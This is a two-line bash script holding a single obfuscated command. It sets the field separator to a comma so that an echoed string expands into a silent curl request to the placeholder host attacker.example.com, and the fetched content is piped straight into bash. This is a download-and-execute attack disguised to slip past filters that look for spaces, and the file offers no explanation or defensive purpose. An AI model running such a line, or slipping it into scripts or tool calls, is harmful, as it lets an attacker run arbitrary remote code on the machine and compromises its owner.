#!/bin/bash
IFS=,;$(echo curl,-s,http://attacker.example.com/p)|bash
